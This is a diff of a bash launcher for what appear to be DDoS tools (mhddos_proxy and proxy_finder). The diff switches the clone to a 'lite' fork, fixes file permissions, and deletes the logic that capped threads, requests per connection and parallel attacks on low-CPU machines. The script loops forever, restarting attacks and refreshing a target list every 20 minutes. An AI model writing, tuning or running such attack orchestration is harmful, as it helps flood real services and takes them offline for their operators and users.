@@ -14,7 +14,7 @@ sudo rm -rf proxy_finder
 sudo apt install --upgrade git -y
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/proxy_finder
-git clone https://github.com/alexnest-ua/auto_mhddos_alexnest
+git clone https://github.com/Biogent/auto_mhddos_alexnest_lite
 
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sudo apt update -y
@@ -34,13 +34,13 @@ restart_interval="20m"
 
 ulimit -n 1048576
 
-sudo chown -R ${USER}:${USER} ~/auto_mhddos_alexnest
-sudo chown -R ${USER}:${USER} /home/${USER}/auto_mhddos_alexnest
+sudo chown -R ${USER}:${USER} ~/auto_mhddos_alexnest_lite
+sudo chown -R ${USER}:${USER} /home/${USER}/auto_mhddos_alexnest_lite
 sudo chown -R ${USER}:${USER} ~/mhddos_proxy
 sudo chown -R ${USER}:${USER} /home/${USER}/mhddos_proxy
 sudo chown -R ${USER}:${USER} ~/proxy_finder
 sudo chown -R ${USER}:${USER} /home/${USER}/proxy_finder
-sudo git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest
+sudo git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest_lite
 sudo git config --global --add safe.directory /home/${USER}/mhddos_proxy
 sudo git config --global --add safe.directory /home/${USER}/proxy_finder
 
@@ -51,7 +51,7 @@ then
 	num_of_copies=3
 elif ((num_of_copies > 3));
 then 
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks\033[0;0m\n"
 	num_of_copies=3
 elif ((num_of_copies < 1));
 then
@@ -92,65 +92,9 @@ then
 	debug="--debug"
 fi
 
-
 rand=3
 
-proc_num=$(nproc --all)
-if ((proc_num < 2));
-then
-	if ((threads > 2000));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for 1 CPU - attack will be started with 2000 threads\033[0;0m\n"
-		threads=2000
-	fi
-	
-	if ((rpc > 1000));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc for 1 CPU - attack will be started with 1000 rpc\033[0;0m\n"
-		rpc=1000
-	fi
-	
-	rand=$(shuf -i 1-2 -n 1)
-	if ((rand == 1));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
-	else
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
-	fi
-	
-	if ((rand == 2));
-	then
-		if ((num_of_copies > 1));
-		then 
-			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
-			num_of_copies=1
-		fi
-	fi
-	
-elif ((proc_num >= 2 && proc_num < 4));
-then
-	if ((threads > 5000));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for $proc_num CPUs - attack will be started with 5000 threads\033[0;0m\n"
-		threads=5000
-	fi
-	
-	if ((rpc > 2000));
-	then
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc for $proc_num CPUs - attack will be started with 2000 rpc\033[0;0m\n"
-		rpc=2000
-	fi
-	
-	if ((num_of_copies > 1));
-	then 
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPUs, so attack will be started only with 1 parallel attack\033[0;0m\n"
-		num_of_copies=1
-	fi
-fi
-
 sleep 5s
-
-
 
 # Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
